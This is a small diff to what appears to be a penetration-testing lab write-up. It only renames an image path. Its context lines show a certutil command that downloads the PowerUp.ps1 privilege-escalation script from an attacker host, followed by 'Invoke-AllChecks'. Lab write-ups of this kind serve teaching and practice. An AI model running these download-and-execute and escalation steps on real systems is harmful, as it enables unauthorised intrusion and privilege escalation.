@@ -83,7 +83,7 @@ certutil -urlcache -f http://10.10.228.214:81/PowerUp.ps1 PowerUp.ps1
 Invoke-AllChecks
 ```
 
-<figure><img src="../../.gitbook/assets/image (1) (2) (1) (1).png" alt=""><figcaption></figcaption></figure>
+<figure><img src="../../.gitbook/assets/image (1) (2) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>
 
 **Kali**
 
